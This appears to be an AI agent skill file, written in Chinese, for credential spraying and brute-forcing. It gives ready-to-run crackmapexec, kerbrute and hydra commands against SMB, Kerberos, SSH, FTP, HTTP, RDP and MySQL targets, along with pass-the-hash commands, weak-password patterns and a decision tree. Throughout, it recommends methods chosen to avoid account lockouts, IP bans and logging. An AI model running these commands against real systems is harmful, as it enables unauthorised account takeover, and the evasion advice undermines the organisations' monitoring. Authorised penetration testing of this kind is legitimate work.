---
name: credential-spray
description: 凭据喷射与暴力破解方法论（hydra/crackmapexec）
when_to_use: 当需要测试弱口令或进行凭据喷射时
allowed-tools: [Bash, Read, Write]
argument-hint: "<target> <service>"
arguments: [target, service]
user-invocable: true
context: inline
---

## 凭据喷射

### 1. 密码策略侦察

在喷射前先了解锁定策略，避免触发账户锁定：

```bash
# AD 密码策略（需要有效凭据或匿名访问）
crackmapexec smb $ARGUMENTS --pass-pol

# 枚举用户名
crackmapexec smb $ARGUMENTS --users
kerbrute userenum -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $ARGUMENTS
```

### 2. 密码喷射（低频率）

```bash
# SMB 喷射（单密码对多用户）
crackmapexec smb $ARGUMENTS -u users.txt -p 'Password123!' --no-bruteforce

# Kerberos 喷射（不触发日志）
kerbrute passwordspray -d <domain> --dc $ARGUMENTS users.txt 'Spring2024!'

# 常见弱密码列表
# <季节><年份>! (Spring2024!, Winter2023!)
# <公司名><数字> (Company123)
# Password1, Welcome1, Changeme1
```

### 3. 针对服务的暴力破解

```bash
# SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$ARGUMENTS -t 4

# FTP
hydra -L users.txt -P passwords.txt ftp://$ARGUMENTS

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt $ARGUMENTS http-get /admin/

# HTTP POST Form
hydra -L users.txt -P passwords.txt $ARGUMENTS http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# RDP
hydra -L users.txt -P passwords.txt rdp://$ARGUMENTS -t 1

# MySQL
hydra -L users.txt -P passwords.txt mysql://$ARGUMENTS
```

### 4. 哈希喷射

```bash
# Pass-the-Hash (SMB)
crackmapexec smb $ARGUMENTS -u admin -H '<NTLM_HASH>'

# 多用户哈希喷射
crackmapexec smb $ARGUMENTS -u users.txt -H hashes.txt --no-bruteforce
```

### 5. 决策树

```
目标服务
  ├── AD 环境
  │     ├── 先获取密码策略（锁定阈值）
  │     ├── 枚举用户名（kerbrute/LDAP）
  │     └── 低频喷射（每次 1 密码，间隔 > 锁定窗口）
  ├── Web 登录
  │     ├── 检查是否有验证码/限速
  │     ├── 尝试默认凭据
  │     └── hydra http-post-form
  ├── SSH/FTP/RDP
  │     ├── 尝试默认凭据
  │     └── hydra 小字典（避免封 IP）
  └── 已有哈希
        └── Pass-the-Hash / hashcat 离线破解
```

### 6. 注意事项

- 始终先确认锁定策略
- 喷射间隔 > 锁定重置时间
- 优先使用 Kerberos 喷射（日志更少）
- 记录所有尝试（审计需要）
